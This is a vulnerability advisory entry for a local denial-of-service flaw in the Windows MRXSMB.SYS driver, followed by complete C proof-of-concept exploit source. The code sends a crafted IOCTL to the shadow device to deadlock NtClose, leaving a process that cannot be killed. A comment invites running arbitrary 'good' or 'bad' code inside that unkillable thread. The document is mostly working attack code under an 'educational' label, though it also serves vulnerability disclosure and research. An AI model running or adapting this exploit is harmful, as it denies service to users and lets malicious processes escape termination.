source: http://www.securityfocus.com/bid/18357/info

The Microsoft SMB driver is prone to a local denial-of-service vulnerability.

A local attacker can exploit this issue to create processes that cannot be killed in affected operating systems, potentially denying service to legitimate users and other software on affected computers. This may aid the attacker in further attacks.

////////////////////////////////////////////////////////////////////////////////
///////// MRXSMB.SYS NtClose DEADLOCK exploit///////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//November 19,2005
////////////////////////////////////////////////////////////////////////////////
////////////////////////////////////////////////////////////////////////////////
//ONLY FOR EDUCATION PURPOSES
////////////////////////////////////////////////////////////////////////////////
// Rub?n Santamarta 
// ruben (at) reversemode (dot) com
// http://www.reversemode.com
////////////////////////////////////////////////////////////////////////////////

#include <windows.h>
#include <stdio.h>


#define MAGIC_IOCTL 0x141047


VOID ShowError()
{
 LPVOID lpMsgBuf;
 FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER| FORMAT_MESSAGE_FROM_SYSTEM,
               NULL,
               GetLastError(),
               MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
               (LPTSTR) &lpMsgBuf,
               0,
               NULL);
 MessageBoxA(0,(LPTSTR)lpMsgBuf,"Error",0);
 exit(1);
}


VOID IamAlive()
{
 DWORD i;
 
 for(i=0;i<0x1000;i++)
 {
  Sleep(1000);
  printf("\rI am a Thread and I am alive [%x]",i);
 } 

}


VOID KillMySelf()
{
     
 DWORD junk;
 DWORD *OutBuff;
 DWORD *InBuff;
 BOOL bResult;
 HANDLE hDevice;
 DWORD i;
 
  hDevice = CreateFile("\\\\.\\shadow", FILE_EXECUTE,FILE_SHARE_READ|FILE_SHARE_WRITE,
                      NULL, OPEN_EXISTING, 0, NULL);
                      
  if (hDevice == INVALID_HANDLE_VALUE) ShowError();
  
  OutBuff=(DWORD*)malloc(0x18);
  if(!OutBuff) ShowError();
  
  OutBuff[3]=(DWORD)hDevice;
  
  DeviceIoControl(hDevice,
                  MAGIC_IOCTL,
                  0,0,
                  OutBuff,0x18,
                  &junk,
                  (LPOVERLAPPED)NULL);
  // MAIN THREAD ENDING.
}


int main(int argc, char *argv[])
{
    
 LPTHREAD_START_ROUTINE GoodThread;
 DWORD dwThreadId;
 DWORD bResult;
 GoodThread=(LPTHREAD_START_ROUTINE)IamAlive;
 

  printf("-=[MRXSMB.SYS NtClose Vulnerability POC]=-\n");
  printf("\t(Only for educational purposes)\n");
  printf("..http://www.reversemode.com..\n\n");
  printf("Launching Thread ...");
  
  // PUT YOUR "GOOD" OR "BAD" CODE HERE
  // e.g GoodThread
  CreateThread(NULL,0,GoodThread,0,0,&dwThreadId);  
  
   
  printf("Done\n");
  printf("I am going to dissapear,but I will be with you forever\n");
  printf("(..)\n\n");
  KillMySelf(); // Immortal mode "on" ;)
  
  return(1); 
}